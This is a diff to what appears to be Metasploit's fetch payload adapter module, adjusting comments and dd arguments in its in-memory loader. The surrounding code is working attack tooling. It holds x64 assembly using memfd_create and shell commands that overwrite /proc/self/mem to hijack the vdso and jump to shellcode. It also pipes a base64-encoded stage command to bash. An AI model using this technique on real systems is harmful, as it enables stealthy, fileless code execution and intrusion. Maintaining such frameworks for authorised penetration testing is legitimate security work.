@@ -237,7 +237,7 @@ module Msf::Payload::Adapter::Fetch
     case module_info['AdaptedArch']
     when 'x64'
       # fd = memfd_create()
-      # ftruncate(fd)
+      # ftruncate(fd, null)
       # pause()
       in_memory_loader_asm = %(
       start:
@@ -245,7 +245,7 @@ module Msf::Payload::Adapter::Fetch
           push rsi
           push rsp
           pop rdi
-          mov rax, 0xfffffffffffffec1
+          mov rax, 0xfffffffffffffec1 
           neg rax
           syscall
           mov rdi,rax
@@ -296,6 +296,9 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _generate_jmp_instruction
+    #
+    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
+    #
     case module_info['AdaptedArch']
     when 'x64'
       %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
@@ -316,11 +319,11 @@ module Msf::Payload::Adapter::Fetch
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
     stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
     stage_cmd << 'exec 3>/proc/self/mem;'
-    stage_cmd << 'dd bs=1 skip=$(echo $vdso_addr) <&3 >/dev/null 2>&1;'
+    stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
     stage_cmd << 'printf $sc >&3;'
     stage_cmd << 'exec 3>&-;'
     stage_cmd << 'exec 3>/proc/self/mem;'
-    stage_cmd << 'dd bs=1 skip=$(echo $addr) <&3 >/dev/null 2>&1;'
+    stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
     stage_cmd << 'printf $jmp >&3;'
 
     cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash & "
